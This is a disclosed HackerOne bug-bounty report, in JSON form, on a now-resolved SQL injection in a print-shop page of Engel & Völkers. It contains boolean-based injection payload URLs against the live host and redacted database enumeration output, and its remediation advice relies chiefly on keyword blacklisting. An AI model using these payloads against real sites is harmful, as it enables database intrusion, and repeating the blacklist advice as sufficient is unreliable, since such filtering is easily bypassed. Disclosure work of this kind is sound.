{"id":914427,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MTQ0Mjc=","url":"https://hackerone.com/reports/914427","title":"SQL Injection at /displayPDF.php (printshop.engelvoelkers.com)","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-07-03T00:05:31.055Z","submitted_at":"2020-07-03T00:05:31.055Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"djurado","url":"/djurado","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/H4WKwC8isEpzxwHMMuLytFZk/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":40276,"url":"https://hackerone.com/engel_volkers","handle":"engel_volkers","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/uc1uE7T18XNNBt7cpjrGoxFk/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/uc1uE7T18XNNBt7cpjrGoxFk/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Engel \u0026 Völkers Technology GmbH","twitter_handle":"euvtechnology","website":"https://www.engelvoelkers.com/","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-06-30T12:51:55.866Z","bug_reporter_agreed_on_going_public_at":"2020-07-07T07:24:01.039Z","team_member_agreed_on_going_public_at":"2021-06-30T12:51:55.727Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Intro\n\nAn SQL injection has been identified. Through this vulnerability an attacker could execute arbitrary SQL statements compromising the integrity of the database and obtain sensitive information, violating the confidentiality of the data.\n\nGiven the great impact of the vulnerability and sensitivity of the exposed data, vulnerability has been classified as a critical risk.\n\n\u0026nbsp;\n## Summary\n\nThe vulnerability is located in the \"document_id\" parameter. \n\n**URL:** https://printshop.engelvoelkers.com/displayPDF.php?document_id=1\u0026order_id=1\n**Vulnerable Parameter:** document_id\n**Payload:** https://printshop.engelvoelkers.com/displayPDF.php?document_id='||'2'='2\u0026order_id=1\n\n\u0026nbsp;\n## Steps to reproduce\n\nIn order to reproduce this vulnerability, we just need to introduce \n1. Payload (false condition): https://printshop.engelvoelkers.com/displayPDF.php?document_id='||'2'='1\u0026order_id=1\n██████\n\n2. Payload (true condition): https://printshop.engelvoelkers.com/displayPDF.php?document_id='||'2'='2\u0026order_id=1\n███\n\nAutomating the explotation process we can obtain all the information from the database. In my case, I just grabbed information about the DB version and database names, privileges, and dba permissions. \n\n██████\n\nInformation: \n\n```\nweb server operating system: Linux Ubuntu 16.04 (xenial)\nweb application technology: Apache 2.4.18\nback-end DBMS: MySQL \u003e= 5.0.12\n\navailable databases [2]:\n[*] █████ws\n[*] information_schema\n\ncurrent user is DBA:    False\n\ndatabase management system users [1]:\n[*] '████████'@'%'\n\ndatabase management system users privileges:\n[*] %█████████% [1]:\n    privilege: USAGE\n```\n\n\u0026nbsp;\n## Mitigations\nIt is recommended to filter the data received on the server side, before being processed all the data entries and parameters that have impact on the databases, eliminating all the special ASCII characters as well as all database instructions. The blacklist filter should contain at least the following elements:!, \", ', $,%, \u0026, /, (,),`, \u003c,\u003e, -, CREATE, ALTER, DROP, TRUNCATE, INSERT, UPDATE , DELETE, SELECT, UNION, FROM, WHERE, REPLACE, FUNCTION, TABLE, COLUMN, ROW, DATABASE.\n\nIn addition, it is recommended to clean the application's entry points on the client side (such as forms), using the aforementioned list, parameterizing outgoing SQL statements to the database, and handling errors in such a way that messages from error shown to the user does not reveal information about the technology that supports the service or sensitive information.\n\n\u0026nbsp;\n## Supporting Material/References:\nAll screenshots attached.\n\n\u0026nbsp;\n\nHope my report will help keep your environment safe in the future.\nPlease, I look forward to hearing from you and have a good evening!\n\nBest Regards,\n\n## Impact\n\nThrough this vulnerability an attacker could execute arbitrary SQL statements compromising the integrity of the database and obtain sensitive information, violating the confidentiality of the data.","weakness":{"id":67,"name":"SQL Injection"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":17,"voters":["mpandi","sa1tama0","t4r0n","b69fb2ebda43240ece9dbeb","sancelisso","ekgaribadmi","ulkish","3rusha","onurgule","the_brain99","and 7 more..."],"severity":{"rating":"critical","author_type":"User"},"structured_scope":{"databaseId":44209,"asset_type":"URL","asset_identifier":"*.engelvoelkers.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8491703,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @djurado,\n\nThank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.\n\nKind regards,\n@bluetooth_headset","automated_response":false,"created_at":"2020-07-03T12:14:37.331Z","updated_at":"2020-07-03T12:14:37.331Z","actor":{"username":"bluetooth_headset","cleared":false,"url":"/bluetooth_headset","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/diZDezyuuh1Pn2qSqL5v9g3Y/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8491714,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @djurado,\n\nUnfortunately, like for your RCE report, I'm not able to reproduce this anymore. Using any of your payloads returns `Error getting db connection SQLSTATE[HY000] [1040] Too many connections`. Can you please confirm that this is no longer reproducible so I can then forward this report to the Engel \u0026 Völkers Technology GmbH team directly?\n\nThanks in advance! :)\n\nKind regards,\n@bluetooth_headset","automated_response":false,"created_at":"2020-07-03T12:16:13.131Z","updated_at":"2020-07-03T12:16:13.131Z","actor":{"username":"bluetooth_headset","cleared":false,"url":"/bluetooth_headset","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/diZDezyuuh1Pn2qSqL5v9g3Y/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8491758,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hello @bluetooth_headset you are right. Seem as if the team has already fixed the issue. \nPlease, forward this report directly to them. \n\nBest regards, \n@djurado","automated_response":false,"created_at":"2020-07-03T12:22:06.544Z","updated_at":"2020-07-03T12:22:06.544Z","actor":{"username":"djurado","cleared":true,"url":"/djurado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/H4WKwC8isEpzxwHMMuLytFZk/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8491798,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @djurado - I'm discussing this submission internally with the Engel \u0026 Völkers Technology GmbH team. You will be updated as soon as there is additional information to share. Thanks for your patience!","automated_response":false,"created_at":"2020-07-03T12:25:57.915Z","updated_at":"2020-07-03T12:25:57.915Z","actor":{"username":"bluetooth_headset","cleared":false,"url":"/bluetooth_headset","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/diZDezyuuh1Pn2qSqL5v9g3Y/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8491932,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @bluetooth_headset,\n\nThank you very much for your effort! I will be waiting for your updates.\n\nBest regards, \n@djurado","automated_response":false,"created_at":"2020-07-03T12:44:53.228Z","updated_at":"2020-07-03T12:44:53.228Z","actor":{"username":"djurado","cleared":true,"url":"/djurado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/H4WKwC8isEpzxwHMMuLytFZk/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8523767,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @djurado - Thank you for your report - this has now been resolved.","automated_response":false,"created_at":"2020-07-07T07:11:47.970Z","updated_at":"2020-07-07T07:11:47.970Z","actor":{"username":"evjh","cleared":false,"url":"/evjh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"djurado","url":"/djurado"},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8523844,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-07-07T07:24:01.070Z","updated_at":"2020-07-07T07:24:01.070Z","first_to_agree":true,"actor":{"username":"djurado","cleared":true,"url":"/djurado","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/H4WKwC8isEpzxwHMMuLytFZk/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":12300009,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-06-30T12:51:55.757Z","updated_at":"2021-06-30T12:51:55.757Z","actor":{"username":"evjh","cleared":false,"url":"/evjh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":12300010,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-06-30T12:51:55.908Z","updated_at":"2021-06-30T12:51:55.908Z","actor":{"username":"evjh","cleared":false,"url":"/evjh","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"engel_volkers","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}